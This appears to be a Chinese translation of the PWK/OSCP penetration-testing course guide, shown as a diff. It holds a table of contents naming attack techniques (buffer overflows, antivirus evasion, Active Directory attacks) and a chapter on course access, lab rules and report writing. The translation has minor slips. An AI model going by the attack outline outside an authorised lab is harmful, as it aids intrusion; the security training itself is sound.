@@ -1,0 +1,29197 @@
+
+# Kali Linux 渗透测试 (OSCP)
+
+## 8.4 总结
+
+## 9. Web 应用攻击
+
+### 9.1 Web 应用评估方法
+
+### 9.2 Web 应用枚举
+
+#### 9.2.1 检查 URL
+
+#### 9.2.2 检查页面内容
+
+#### 9.2.3 查看响应头
+
+#### 9.2.4 检查站点地图（Sitemaps）
+
+#### 9.2.5 定位管理控制台
+
+### 9.3 Web 应用评估工具
+
+#### 9.3.2 DIRB
+
+#### 9.3.3 Burp Suite
+
+#### 9.3.4 Nikto
+
+### 9.4 利用 Web 漏洞
+
+#### 9.4.1 利用管理控制台
+
+#### 9.4.2 跨站脚本 (XSS)
+
+#### 9.4.3 目录遍历漏洞
+
+#### 9.4.4 文件包含漏洞
+
+#### 9.4.5 SQL 注入
+
+### 9.5 进阶
+
+#### 9.5.1 练习题
+
+### 9.6 总结
+
+## 10 x86 架构简介
+
+### 10.1 x86 架构简介
+
+#### 10.1.1 程序内存
+
+#### 10.1.2 CPU 寄存器
+
+### 10.2 缓冲区溢出实战
+
+#### 10.2.1 示例漏洞代码
+
+#### 10.2.2 介绍 Immunity 调试器
+
+#### 10.2.3 导航代码
+
+#### 10.2.4 溢出缓冲区
+
+#### 10.2.5 练习题
+
+### 10.3 总结
+
+## 11 Windows 缓冲区溢出
+
+### 11.1 发现漏洞
+
+#### 11.1.1 协议模糊
+
+### 11.2 Win32 缓冲区溢出
+
+#### 11.2.1 关于 DEP、ASLR
+
+#### 11.2.2 重现崩溃
+
+#### 11.2.3 控制 EIP
+
+#### 11.2.4 寻找 Shellcode 空间
+
+#### 11.2.5 检查坏字符
+
+#### 11.2.6 重定向执行流
+
+#### 11.2.7 寻找返回地址
+
+#### 11.2.8 使用 Metasploit 生成 Shellcode
+
+
+
+### 11.2.9 获取 Shell
+### 11.2.10 改进利用程序
+
+## 11.3 总结
+
+## 12 Linux 缓冲区溢出
+
+### 12.1.1 关于 DEP、ASLR 和 Canaries（金丝雀）
+### 12.1.2 重现崩溃
+### 12.1.3 控制 EIP
+### 12.1.4 寻找 Shellcode 空间
+### 12.1.5 检查坏字符
+### 12.1.6 寻找返回地址
+### 12.1.7 获取 Shell
+
+## 12.8 总结
+
+## 13 客户端攻击
+
+### 13.1 了解目标
+#### 13.1.1 被动客户端信息收集
+#### 13.1.2 主动客户端信息收集
+
+### 13.2 利用 HTML 应用
+#### 13.2.1 探索 HTML 应用
+#### 13.2.2 HTA 攻击实战
+
+### 13.3 利用 Microsoft Office
+#### 13.3.1 安装 Microsoft Office
+#### 13.3.2 Microsoft Word 宏
+#### 13.3.3 对象链接与嵌入（OLE）
+#### 13.3.4 规避保护视图
+
+## 13.4 总结
+
+## 14 定位公开利用程序
+
+### 14.1 警告事项
+### 14.2 搜索利用程序
+#### 14.2.1 在线安全资源
+#### 14.2.2 离线利用资源
+### 14.3 整合汇总
+### 14.4 总结
+
+## 15. 修复漏洞
+
+### 15.1 修复内存损坏漏洞
+- 15.1.1 概述与考虑因素
+- 15.1.2 导入并检查利用程序
+- 15.1.3 交叉编译利用代码
+- 15.1.4 修改 Socket 信息
+- 15.1.5 修改返回地址
+- 15.1.6 修改有效负载（Payload）
+- 15.1.7 修改溢出缓冲区
+
+### 15.2 修复 Web 漏洞
+- 15.2.1 考虑因素与概述
+- 15.2.2 选择漏洞
+- 15.2.3 修改连接信息
+- 15.2.4 排查“索引越界”错误
+
+### 15.3 总结
+
+## 16 文件传输
+
+### 16.1 考虑因素与准备
+- 16.1.1 传输攻击工具的危险
+- 16.1.2 安装 Pure-FTPD
+- 16.1.3 非交互式 Shell
+
+### 16.2 使用 Windows 宿主机传输文件
+- 16.2.1 非交互式 FTP 下载
+- 16.2.2 使用脚本语言下载 Windows 文件
+- 16.2.3 使用 exe2hex 和 PowerShell 下载 Windows 文件
+- 16.2.4 使用脚本语言在 Windows 上传
+- 16.2.5 使用 FTTP 上传文件
+
+### 16.3 总结
+
+## 17 规避杀毒
+
+### 17.1 什么是杀毒软件
+### 17.2 检测恶意代码的方法
+- 17.2.1 基于签名的检测
+- 17.2.2 启发式和基于行为的检测
+
+### 17.3 绕过杀毒检测
+- 17.3.1 磁盘规避
+- 17.3.2 内存规避
+- 17.3.3 杀毒规避：实例实例
+
+### 17.4 总结
+
+## 18 权限提升
+
+### 18.1 信息收集
+- 18.1.1 手动枚举
+- 18.1.2 自动枚举
+
+### 18.2 Windows 权限提升示例
+- 18.2.1 理解 Windows 权限和完整性级别
+- 18.2.2 用户账户控制 (UAC) 简介
+- 18.2.3 绕过用户账户控制 (UAC)：fodhelper.exe 案例研究
+- 18.2.4 不安全的文件权限：Servio 案例研究
+- 18.2.5 利用未引号的服务路径
+
+
+
+- 18.2.6 Windows 内核漏洞：USBPcap 案例研究 ... 560
+
+### 18.3 Linux 权限提升示例 ... 565
+
+- 18.3.1 理解 Linux 权限 ... 565
+
+- 18.3.2 不安全的文件权限：Cron 案例研究 ... 566
+
+- 18.3.3 不安全的文件权限：`/etc/passwd` 案例研究 ... 567
+
+- 18.3.4 内核漏洞：`CVE-2017-1000112` 案例研究 ... 568
+
+### 18.4 总结 ... 570
+
+## 19 密码攻击 ... 572
+
+### 19.1 字典列表 ... 572
+
+- 19.1.1 标准字典列表 ... 573
+
+- 19.1.2 暴力破解 ... 575
+
+### 19.2 普通服务方法 ... 578
+
+- 19.2.1 使用 Medusa ... 579
+
+- 19.2.2 使用 Crowbar ... 581
+
+- 19.2.3 使用 THC-Hydra ... 582
+
+- 19.2.4 使用 THC-Hydra ... 583
+
+### 19.3 利用哈希值（Hashes） ... 586
+
+- 19.3.1 获取哈希值 ... 586
+
+- 19.3.2 在 Windows 中 ... 590
+
+- 19.3.3 密码破解 ... 592
+
+### 19.4 总结 ... 595
+
+## 20 重定向与隧道 ... 596
+
+### 20.1 转发 ... 596
+
+- 20.1.1 Rinet ... 596
+
+### 20.2 SSH 隧道 ... 600
+
+- 20.2.1 本地端口转发 ... 600
+
+- 20.2.2 远程端口转发 ... 604
+
+- 20.2.3 动态端口转发 ... 606
+
+### 20.3 PLINK ... 610
+
+### 20.4 NETSH ... 613
+
+### 20.5 穿透深度包检测的隧道 ... 616
+
+### 20.6 总结 ... 621
+
+## 21 活动目录（Active Directory）攻击 ... 622
+
+### 21.1 活动目录理论 ... 622
+
+### 21.2 活动目录枚举 ... 623
+
+- 21.2.1 传统方法 ... 624
+
+- 21.2.2 现代方法 ... 626
+
+- 21.2.3 嵌套组解析 ... 632
+
+- 21.2.4 当前登录用户 ... 635
+
+- 21.2.5 通过服务主体名称（SPN）枚举 ... 638
+
+### 21.3 活动目录认证 ... 642
+
+- 21.3.1 NTLM 认证 ... 644
+
+- 21.3.2 Kerberos 认证 ... 644
+
+- 21.3.3 缓存凭据的存储与检索 ... 647
+
+- 21.3.4 服务账户攻击 ... 651
+
+- 21.3.5 低强度密码猜测 ... 654
+
+### 21.4 活动目录横向移动 ... 656
+
+- 21.4.1 传递哈希值 (Pass the Hash) ... 657
+
+- 21.4.2 传递哈希值 (Overpass the Hash) ... 658
+
+- 21.4.3 传递票据 (Pass the Ticket) ... 662
+
+- 21.4.4 分布式组件模型 (DCOM) ... 665
+
+### 21.5 活动目录持久化 ... 671
+
+- 21.5.1 黄金票据 (Golden Tickets) ... 671
+
+- 21.5.2 域控制器同步 ... 675
+
+### 21.6 总结 ... 677
+
+## 22. Metasploit 框架 ... 678
+
+### 22.1 Metasploit 用户界面与设置 ... 679
+
+### 22.1.1 熟悉 MSF 语法 ... 679
+
+### 22.1.2 Metasploit 数据库访问 ... 681
+
+### 22.1.3 辅助模块 (Auxiliary Modules) ... 683
+
+### 22.2 利用模块 (Exploit Modules) ... 688
+
+### 22.2.1 SyncBreeze 企业版 ... 689
+
+### 22.3 Metasploit 载荷 (Payloads) ... 692
+
+### 22.3.1 分阶段 (Staged) 与非分阶段 (Non-Staged) 载荷 ... 692
+
+### 22.3.2 Meterpreter 载荷 ... 693
+
+### 22.3.3 实验性 Meterpreter ... 694
+
+### 22.3.4 可执行载荷 ... 696
+
+### 22.3.5 Metasploit 利用多重处理器 (Multi Handler) ... 698
+
+### 22.3.6 客户端攻击 ... 701
+
+### 22.3.7 高级功能与传输层 ... 702
+
+### 22.4 构建我们自己的 MSF 模块 ... 706
+
+### 22.5 使用 Metasploit 进行后渗透渗透 ... 711
+
+### 22.5.1 核心利用功能 ... 711
+
+### 22.5.2 进程迁移 ... 712
+
+### 22.5.3 后渗透模块 ... 713
+
+### 22.5.4 使用 Metasploit 框架进行跳板 (Pivoting) ... 716
+
+### 22.6 Metasploit 自动化 ... 721
+
+### 22.7 总结 ... 723
+
+### 23.1 安装、设置与用法 ... 724
+
+### 23.1.1 PowerShell Empire 语法 ... 725
+
+### 23.1.2 监听器 (Listeners) 与暂存器 (Stagers) ... 726
+
+### 23.1.3 Empire 代理 ... 729
+
+### 23.2 PowerShell 模块 ... 733
+
+### 23.2.1 场景感知 (Situational Awareness) ... 733
+
+### 23.2.2 凭据与权限提升 ... 736
+
+### 23.2.3 横向移动 (Lateral Movement) ... 739
+
+### 23.3 在 Empire 和 Metasploit 之间切换 ... 741
+
+### 23.4 总结 ... 744
+
+## 24. 组装碎片：渗透测试拆解 ... 745
+
+### 24.1 公网网络枚举 ... 745
+
+### 24.2 针对 Web 应用程序 ... 746
+
+### 24.2.1 Web 应用程序枚举 ... 747
+
+### 24.2.2 SQL 注入利用 ... 755
+
+### 24.2.3 破解密码 ... 763
+
+### 24.2.4 枚举管理界面 ... 765
+
+### 24.2.5 获取 Shell ... 768
+
+### 24.2.6 后渗透枚举 ... 775
+
+### 24.2.7 创建稳定的跳板点 ... 777
+
+### 24.3 针对数据库 ... 781
+
+### 24.3.1 枚举 ... 781
+
+### 24.3.2 尝试利用数据库 ... 785
+
+### 24.4 对 Web 应用程序服务器进行深层枚举 ... 789
+
+### 24.4.1 更彻底的后渗透 ... 789
+
+### 24.4.2 权限提升 ... 790
+
+### 24.4.3 搜索数据库凭据 ... 792
+
+### 24.5 再次针对数据库 ... 793
+
+### 24.5.1 利用 ... 793
+
+### 24.5.2 后渗透枚举 ... 796
+
+### 24.5.3 创建稳定的反向隧道 ... 798
+
+### 24.6 针对 Poultry ... 800
+
+### 24.6.1 枚举 ... 800
+
+### 24.6.2 利用（或直接登录） ... 802
+
+### 24.6.3 后渗透枚举 ... 804
+
+### 24.6.4 未引号搜索路径利用 ... 811
+
+### 24.6.5 后渗透枚举 ... 816
+
+### 24.7 内部网络枚举 ... 817
+
+### 24.7.1 审查结果 ... 819
+
+### 24.8 针对 Jenkins 服务器 ... 824
+
+### 24.8.1 应用程序枚举 ... 825
+
+### 24.8.2 利用 Jenkins ... 831
+
+### 24.8.3 后渗透枚举 ... 840
+
+### 24.8.4 权限提升 ... 842
+
+### 24.8.5 后渗透枚举 ... 845
+
+### 24.9 针对域控制器 ... 847
+
+### 24.9.1 利用域控制器 ... 847
+
+### 24.10 总结 ... 851
+
+## 25. 加强训练：实验课 ... 852
+
+### 25.1 现实模拟 ... 852
+
+### 25.2 机器依赖 ... 852
+
+### 25.3 解锁网络 ... 852
+
+### 25.4 路由 ... 853
+
+### 25.5 机器顺序与攻击向量 ... 853
+
+### 25.6 防火墙 / 路由器 / NAT ... 853
+
+### 25.7 密码 ... 853
+
+### 25.8 总结 ... 853
+
+
+
+# 使用 Kali Linux 进行渗透测试：通用课程信息
+
+欢迎来到使用 Kali Linux 进行渗透测试 (PWK) 课程！
+
+PWK 是为系统和网络管理员以及安全专业人士设计的，他们可能希望在专业渗透测试领域迈出严谨且具有重要意义的一步。本课程将帮助你更好地理解恶意实体针对网络使用的攻击手段和技术。恭喜你迈出了第一步。我们非常欢迎你的加入。
+
+## 1.1 关于 PWK 课程
+
+让我们花一点时间回顾一下课程本身及其每一个组成部分。你应该拥有以下访问权限：
+
+- PWK 课程材料
+- 内部 VPN 实验网络访问权限
+- 学生论坛凭据
+- 实时支持
+- 一次 OSCP 考试机会
+
+让我们逐一回顾这些项目。
+
+### 1.1.1 PWK 课程材料
+
+课程包括这份 PDF 格式的本指南以及配套的课程视频。PDF 和视频中包含的信息有所重叠，这意味着你可以阅读实验指南并观看视频来填补任何空白，反之亦然。在某些模块中，实验指南比视频更详细。请务必关注这两者，这一点非常重要。
+
+实验在每个章节末尾还包含练习。完成课程练习将帮助你在尝试发现和利用实验机器中的漏洞时变得更加高效。
+
+### 1.1.2 访问内部 VPN 实验网络
+
+你在课程开始当天收到的欢迎邮件包包含了你的 VPN 凭据和相应的 VPN 连接包。这些内容将使你能够访问内部 VPN 实验网络，你将会在那里花费大量时间。
+
+实验时间从你的课程开始开始，并按持续访问时间计费。实验时间仅在紧急情况下可以暂停。
+
+如果你的实验时间过期或即将过期，你可以随时购买实验扩展。如果你购买了额外的实验时间，系统会发送一个个性化的购买链接到你的电子邮箱地址。如果你在访问权限仍然有效时购买实验扩展，你可以继续使用相同的 VPN 连接池。如果你在现有实验访问结束后购买实验扩展，你将收到一个新的 VPN 连接池。
+
+### 1.1.3 Offensive Security 学生论坛
+
+学生论坛仅供 Offensive Security 的学生访问。你的论坛凭据也是欢迎邮件包的一部分。访问权限不会在实验时间结束时过期。在 OSCP 考试结束后，你也可以继续使用论坛。
+
+在论坛上，你可以提问、分享有趣的资源并提供提示（只要不包含剧透）。我们要求所有论坛成员对自己发布的内容保持审慎，特别注意不要通过发布完整的解决方案来破坏别人的整体课程体验。不顾考虑的帖子可能会被审核。
+
+除了其他学生外，你还会发现一些可以帮助澄清课程介绍概念的额外资源。这些包括对部分实验机器的详细演练说明（walkthroughs）。这些说明旨在说明获得最佳所需的思维和方法论。
+
+一旦你成功通过 OSCP 考试，你将获得证书持有者子论坛的访问权限。
+
+### 1.1.4 实时支持
+
+实时支持允许你直接与我们的学生管理员交流。这些是 Offensive Security 的工作人员，他们参加过 PWK 课程并通过了 OSCP 认证考试。
+
+学生管理员负责协助技术问题，他们也可能澄清课程材料和练习中的项目。此外，如果你已经尽了全力但在某台实验机器上完全卡住了，学生管理员可能会提供微小的提示来帮助你继续。
+
+请记住，学生管理员提供的信息将取决于你能提供的详细程度。你提供的关于已尝试的操作和已取得结果的细节越多，越好。
+
+### 1.1.5 OSCP 考试机会
+
+初始购买 PWK 课程时包含了一次 OSCP 考试机会。考试是可选的，取决于你是否决定要参加。你可以在实验时间结束后 120 天内安排并完成考试尝试。120 天后，该机会将失效。
+
+如果你的考试机会过期，你可以购买额外的，并在购买之日起 120 天内参加。
+
+如果你在拥有未使用考试机会的情况下购买实验扩展，你的考试过期日期将是实验扩展结束后的 120 天。
+
+要预约你的 OSCP 考试，请使用你的个性化预约链接。该链接位于欢迎邮件中。你也可以通过你的 PWK 课程控制面板找到它。
+
+## 1.2 学习的总体策略
+
+每个学生都是独特的，因此没有学习本课程和材料的绝对最佳方法。我们鼓励你按照自己的节奏学习课程。你还需要时间管理技巧来保持进度。
+
+我们建议通过以下方法处理课程材料：
+
+- 审查欢迎和课程信息邮件中包含的所有信息。
+- 学习课程材料。
+- 完成所有练习。
+- 攻击机器。
+
+### 1.2.1 欢迎和课程信息
+
+首先，花时间阅读收到的邮件中包含的所有信息。这些邮件包含了 VPN 凭据和论坛等。
+
+### 1.2.2 课程材料
+
+一旦审查了上述信息，就可以开始学习课程材料了。你可能需要在上面花费时间。我们建议将课程视为马拉松，而不是冲刺。
+
+### 1.2.3 课程练习
+
+我们建议在进入下一个模块之前完成练习。完成这些练习所需的时间精力取决于你的技能水平。我们鼓励你坚持下去。
+
+### 1.2.4 PWK 实验
+
+在完成课程材料后，你应该准备好应对实验，目标是攻破每台机器并获取权限 Shell。练习包含了关于各种实验机器的信息，如果你在记录方面非常认真，你只需要去获取一些“触手可得的果实”。
+
+## 1.4 关于渗透测试
+
+渗透测试是对目标或边界进行的持续性研究和攻击循环。攻击应当是结构化的、经过计算的，并且在可能的情况下，在实施到实时目标之前先在实验室中进行验证。以下是我们对渗透测试过程的可视化：
+
+图 1：渗透测试方法论图
+
+正如模型所示，你收集的信息越多，成功渗透的概率就越高。一旦你渗透了目标边界，你通常会重新开始循环。例如，你可能会收集有关内部网络的信息以便渗透它。
+
+每位安全专业人员都会开发自己的方法论，这通常基于其技术专长。我们鼓励你查看诸如开放 Web应用程序安全项目（OWASP）⁶等页面，了解一些常用的渗透测试方法论。
+
+## 1.5 法律
+
+请花时间阅读下方的我们的正式版权声明。
+
+在您阅读之前，我们想说明本出版物仅供您个人使用。对本出版物的任何复制或与任何第三方共享本出版物的全部或部分均均违反
+
+> ⁶ (OWASP, 2019), https://www.owasp.org/index.php/Penetration_testing_methodologies
+
+(a) 我们的知识产权 (b) 您在在我们处注册时接受的合同条款 (c) 我们的学术政策。
+
+这包括：
+
+- 通过在任何第三方平台、存储库或社交媒体网站上发布本出版物提供给他人
+- 因为您没有采取足够的措施来保护它而无意中共享本出版物
+- 将本出版物的全部或部分用于自身训练以外的任何目的，包括提供或告知任何训练课程的内容或用于任何商业目的。
+
+我们的学术政策可以在 `https://www.offensive-security.com/legal-docs/` 找到。根据我们的判断，如果我们发现您违规：
+
+- 我们将撤销您获得的所有 Offensive Security 证书
+- 我们将取消您参加任何 Offensive Security 课程和考试的资格
+- 我们将取消您未来购买 Offensive Security 的资格
+
+以下文档包含课程练习，应仅在 Offensive Security 托管的实验室环境中尝试。请注意，实验室描述的大多数攻击如果在您没有权限测试和攻击的机器上尝试，将是非法的。由于 Offensive Security 实验室环境与互联网隔离，因此在内部执行攻击是安全的。安全并未授权您在自己的托管环境之外执行这些攻击，并对任何此类行为不承担法律责任。
+
+## 1.6 MegaCorp.com 和 Sandbox.local 域名
+
+`megacorp.com` 域名及其子域名代表了由 Offensive Security 创建的虚构公司。它有一个看似外部的网络存在，非常适合在整个课程中演示某些概念。
+
+请注意，该域名在内部 VPN 实验室之外可以访问，且仅应在课程练习期间用于被动和主动信息收集。严禁主动尝试破解它。
+
+`sandbox.local` 域名代表一个虚构的内部公司网络，用于使用课程中涵盖的方法和技术演示完整的渗透测试。
+
+`sandbox.local` 域名仅可通过作为实验室访问一部分的 VPN 访问。
+
+## 关于 PWK VPN 实验室
+
+PWK 实验室提供包含各种漏洞机器的隔离环境。使用实验室完成课程练习，并练习课程材料中教授的技术。
+
+以下图片是 PWK 实验室的简化图。
+
+图 2：PWK 实验室简化图
+
+（注：此处原文中关于包含漏洞机器的描述段落存在格式错乱，已根据上下文逻辑翻译并整理）
+
+这是您需要针对的机器：
+
+| 实验室 | 子网 | 目标开始 | 目标结束 |
+| :--- | :--- | :--- | :--- |
+| PWK | `10.11.0/24` | `10.11.1` | `10.11.254` |
+
+*表 1 - Offensive Security 实验室范围*
+
+您所连接的实验室是多个学生共享的。
+
+## 1.7.4 客户端机器
+
+你将被分配三台专用客户端机器，用于课程材料和练习。这包括一个 Windows 10 客户端、一个 Debian Linux 客户端以及一个 Windows Server 2016 域控制器。
+
+每当你连接到 VPN 时，都需要重置用于学生控制面板的机器。当你选择重置 Windows 10 或 Windows Server 2016 客户端时，两台机器都会被重置。在你断开 VPN 一段时间后，分配给你的客户端机器会自动关闭并恢复到初始状态。
+
+考虑到这一点，我强烈建议不要在任何客户端机器上存储任何你不乐意丢失的信息。
+
+
+
+## 1.7.5 Kali 虚拟机
+
+我们在课程期间提供的 VMware 镜是 Kali Linux 的默认 64 位构建版本。我们建议你通过电子邮件欢迎包中提供的 URL 下载并使用该 VMware 镜像。虽然你可以自由使用 VirtualBox 或 Hyper-V 镜像甚至你自己的 Kali 安装版，但我们只能对提供的 VMware 镜像提供支持。这些镜像由 Offensive Security 慷提供，不受 Kali Linux 项目团队的支持。
+
+## 1.7.6 实验室行为与限制
+
+Offensive Security 实验室是一个共享环境。在探索实验室时，请记住以下几点：
+
+- 避免更改用户密码。如果可能，请向系统添加新用户。如果进入机器的唯一方法是更改密码，请在完成该特定机器后将其改回。
+- 一旦你获得了所需的访问权限，应恢复在机器上禁用上禁用的任何防火墙规则。
+- 不要让机器处于未被利用的状态。
+- 完成后，从机器中删除任何成功的（及失败的）漏洞利用。如果可能，请创建一个目录来存储你的漏洞。这将最大限度地减少他人意外使用你的漏洞攻击目标的概率。
+
+你只需要在完成每台机器的操作后重置它即可完成这一切。要重置机器，请使用学生控制面板。
+
+内部 VPN 实验室网络严格执行以下限制。如果你违反了以下任何限制，Offensive Security 保留禁用你访问的权利。
+
+https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/
+
+- 1. 不要对网络进行 ARP 欺骗或进行任何类型的投毒攻击或中间人攻击。
+- 2. 除非对于权限提升绝对绝对必要，否则不要删除或移动任何关键系统文件或提示。
+- 3. 不要更改 `network-secret.txt` 或 `proof.txt` 文件的内容。
+- 4. 不要故意干扰在实验室中工作的同学。这包括但不限于：
+    - 1. 关闭机器
+    - 2. 将用户踢出机器
+    - 3. 阻塞特定的 IP 地址或范围
+    - 4. 黑入其他学生的客户端或 Kali 机器
+
+## 1.8 报告
+
+报告编写通常被视为渗透测试中不可避免的“必要恶”。遗憾的是，许多技术水平高且聪明的测试人员没有给予其应有的关注；一份编写良好且看起来专业的报告比其编写糟糕、技术高超的对手能获得更多积极关注。
+
+由于编写报告是任何渗透测试的一部分，也是 OSCP 考试的一部分，我们希望在你接触课程材料之前，花一点时间谈谈报告。我们希望通过回顾这些指南帮助你考虑如何解释渗透测试的行为、结果和产出。
+
+报告编写有许多方法，我们并不声称 Offensive Security 的报告是编写它的绝对最佳方法。如果该示例有帮助，请尽管使用。如果没有，请随时修改设计或创建其他更适合你的内容。
+
+我们认为在编写报告时，有一些通用指南是必须记住的。这些指南没有特定的顺序，因为它们都同等重要。
+
+### 1.8.1 考虑目标
+
+考虑到评估的目标。你设定要完成什么？你是否希望在报告中得出一个单一、具体的陈述？许多缺乏经验的渗透测试人员会陷入评估的技术方面和实现这些方面所需的技能中，但渗透测试绝不是仅仅为了展示才华的机会。在编写报告时，请记住初始目标。
+
+组织你的思路，构建一份能引起听众共鸣的报告。我们强烈建议在开始之前列一个大纲。你可以通过创建章节标题（无需实际内容或解释）来快速方便地完成这一点。这将帮助你避免重复自己或遗漏关键信息。它还可以帮助你克服“写作瓶颈”。
+
+(Offensive Security, 2019), https://www.offensive-security.com/reports/sample-penetration-testing-report.pdf
+
+### 1.8.2 考虑受众
+
+思考谁将阅读并根据你在报告中包含的信息采取行动。你的受众希望从中学习到什么？他们是谁？在大多数情况下，技术知识水平完全不同的人会阅读你的报告。尝试编写能够满足报告每位读者的内容。从实践上来说，这意味着分章节编写报告，以满足不同受众的需求。
+
+让我们花一点时间谈谈受众。
+
+你可能预计公司的高层高管会阅读报告的部分内容。在大多数情况下，这些高管没有时间或欲望阅读所有的技术细节。出于这个原因，大多数报告都从执行摘要（Executive Summary）开始。执行摘要应该是简短的（不超过两页）、对结果和客户安全状况的高级说明。由于这是他们唯一阅读的部分，请确保为高管专门定制这一部分的语言。
+
+还会有技术专业人员更详细地阅读你的报告。报告的其他部分将涵盖这些细节，并包括我们对目标造成的惨烈影响。
+
+### 1.8.3 应包含的内容
+
+更具体地说，考虑包含什么是有帮助的。请记住，你的读者想要解决你发现的问题，因此你包含的所有内容都应该是相关且有意义的。充斥着过多边缘或无关信息的报告会让阅读和理解变得困难。不要为了让报告变长而包含填充材料。
+
+以下是关于应该包含和应该排除的四条快速要点：
+
+- 1. 不要在报告中包含一页又页的工具输出，除非它绝对相关。例如 Nmap 的输出。你没有理由包含输出的每一行，因为这没有增加任何价值。如果你有一个想要表达的观点，例如在公共主机上暴露了大量的 SNMP 服务，请使用 `-O` 标志并过滤出开启了 SNMP 端口的主机。
+- 2. 善用截图。同样的规则适用于你添加到报告中的其他内容。使用截图是为了说明观点，而不仅仅是为了展示酷的输出。例如，假设你在 Linux 上获取了 root 权限。与其显示 15 张只有 root 用户才能访问的各种目录列表，不如包含一张 `whoami` 命令的单一截图。技术精明的读者可能只需要这就能理解你成就了什么。
+
+使用 Kali Linux 2.0 进行渗透测试
+
+- 4 也许最重要的是，请回顾评估目标。思考你想要表达的观点与目标之间的关系，以及每条信息将如何无法强化该观点。
+
+### 1.8.4 考虑呈现形式
+
+内容的呈现方式与内容本身同样重要。无论任何时候，对语言的掌握都是至关重要的。我们理解对于我们的许多学生来说，英语不是他们的母语，但编写流畅且逻辑严密的句子仍然非常重要。在这种情况下，重要的是“更加努力（Try Harder）”并尽尽全力，专注于阐述简单易懂的观点。
+
+此外，你可能希望记住以下几点：
+
+- 1. 保持一致。注意间距、标题样式、选择等方面不一致之处。对齐不齐和不一致的段落或标题看起来不专业且粗糙。
+- 2. 检查拼写，检查拼写，再检查拼写！这一点不言自明。这里不是 `Your`，而是 `You're`。
+
+这些提示应该让你对如何编写一份看起来专业且连贯的报告并清晰地传达意图有一个大致的了解。最终，报告是你交付给客户的产品。确保它能够恰当且专业地代表你和你的工作。
+
+### 1.8.5 PWK 报告
+
+在完成课程指南和视频后，你将在我们的内部 VPN 实验室中进行一次全面的渗透测试。并不强制要求对这次练习性渗透测试进行报告，但将其作为练习你在整个职业生涯中使用的重要技能的一种方式可能会好处。
+
+如果你决定编写并提交报告，除非另有说明，否则你需要记录此实验室指南中的课程练习。你可以将这些内容作为附录添加到完成认证考试后提交的最终报告中。
+
+最终文档应作为正式渗透测试报告提交。你的报告应包含执行摘要，以及所有指标的详细列举（包括你的专用客户机器）。有关报告要求的详细信息，包括模板和示例报告，可以在我们的支持网站上获取¹⁰
+
+¹⁰ (Offensive Security, 2019), https://support.offensive-security.com/pwk-network-intro-guide/#reporting
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+28
+
+计划为通过 OSCP 认证考试申请 CPE 学分的学生需要编写并提交一份内部 VPN 实验室网络的报告，并将课程练习作为附录。
+
+### 1.8.6 笔记
+
+信息是关键，因此记录并保持有组织性的笔记至关重要。这对于 PWK 课程、相应的 OSCP 考试以及一般的渗透测试都是如此。
+
+笔记的详细程度取决于你。我们建议从开始开始就记录一切。这包括所有的控制台输出，以及关键事件的截图。宁多勿少比为了填补空白而重复材料要好。
+
+在工作中保持条理从长远来看是有回报的。如果你几周、几个月或几年后需要查看笔记，组织将使你能够快速找到所需信息。培养良好的文档技能将允许你快速找到几天前用于利用机器的某条长命令，万你以后需要再次利用它，或者在攻破目标机器后的后渗透阶段交叉引用用户信息。
+
+随着时间的推移，你将开始为笔记生成粗略的模板和格式。结果是你的笔记布局和细节在课程开始和结束时会有所不同。我们学生经常评论说他们在开始时遗漏了多少信息，以及他们如何回到“早期目标”去收集这些信息。
+
+旨在尽可能多地收集信息。这将允许你在无法访问实验室的情况下生成一份完整的报告。拥有良好、详细的笔记在实验室的后渗透阶段将特别有用，因为随手可用的信息碎片应该帮助你找到实验室机器之间清晰的联系等。良好的文档实践还将为你节省大量时间并避免一些头疼的问题。
+
+#### 1.8.6.1 设置与技巧
+
+做好笔记的关键在于能够尽可能地收集信息，并能够随时访问它们。信息量可能会随时间变化，你寻找所需内容的过程也可能发生变化。
+
+
+
+你还需要意识到信息存储何处——是本地还是远程？是否加密了？你的笔记中是否包含任何敏感信息？如果是，请考虑你的信息（更糟糕的是你客户的信息）可能落入坏人之手的可能性。
+
+从开始，我们强烈建议你捕捉并记录一切。某些工具支持将你的输出写入文件，其中一些具有报告功能。捕获终端输出并将其与个人笔记结合有时也会很有帮助。确保你进行注释、高亮重要部分，并写下你可能认为相关的内容。记住，有时一张截图胜过千言万语，所以确保你也拍摄了它们。
+
+### 1.8.6.2 笔记工具
+
+你有许多笔记工具可以选择，例如 OneNote¹¹ (Windows/macOS)、DayOne¹² (macOS) 或 Joplin¹³ (Windows/Linux) 等。你也可以选择 MDWiki⁴，这是一个基于 markdown 的 wiki，允许你用 markdown 编写并将输出渲染为 HTML。
+
+无论你偏好哪种工具，收集原始（RAW）输出的最佳方法是设置某种日志记录并在需要之前忘记它。有几种方法可以获取显示在终端的所有输出，包括：
+
+- `script`: 执行后，所有输出（包括 bash 的颜色和退格）都会保存到一个文件中，可以随时重放。
+- `terminator`: 一种终端模拟器，具有功能和插件，例如 `Logger`（将所有输出保存到文件）和 `TerminalShot`（从终端截图）。
+
+注意：重定向输出 (`>`) 或使用 `tee` 也是一种选择，但你必须对每个命令使用它们，所以你每次都必须运行。
+
+为了处理渗透测试期间收集的大量信息，我们喜欢使用多功能笔记应用程序初步记录所有的发现。使用此类应用程序有助于在数字和心理上组织数据。渗透测试结束后，我们可以使用中间文档完成完整的报告。
+
+无论你使用什么种程序编写中间文档，只要输出清晰易于读即可。记录你的工作和发现是完成工作的唯一专业方式！
+
+## 1.8.6.3 备份
+
+世界上两类人：一类是定期备份笔记的人，另一类是希望自己这样做的人。备份通常被视为保险。你永远不知道什么时候需要它！作为一般原则，我们建议你定期备份笔记。将你的备份放在安全的地方。你绝对不希望它们出现在公共仓库或云端！
+
+# 1.9 关于 OSCP
+
+OSCP 认证考试在私有 VPN 中模拟了一个实时网络，其中包含少量漏洞的机器。要通过考试，你必须获得 70 分。获得有限访问权限以及完全系统控制权均可得分。在考试期间，该环境将专为你为你提供，你有 23 小时 45 分钟的时间完成考试。
+
+每个目标机器的特定说明将位于你的考试控制面板中，该面板将在考试开始后才会对你开放。你的考试包将包含 VPN 连接包和额外说明，并包含你用于访问考试控制面板的唯一 URL。
+
+为了确保我们认证的完整性，考试将进行远程监考。你要求在考试开始前 15 分钟到达，以进行身份验证和其他准备工作。在安排考试之前，请务必阅读我们的常见问题解答¹⁵。
+
+考试结束后，你将有 24 小时的时间提交报告并记录你的发现。我们将根据考试报告的质量和内容进行评估，请尽可能包含细节，并确保你的发现是可复现的。
+
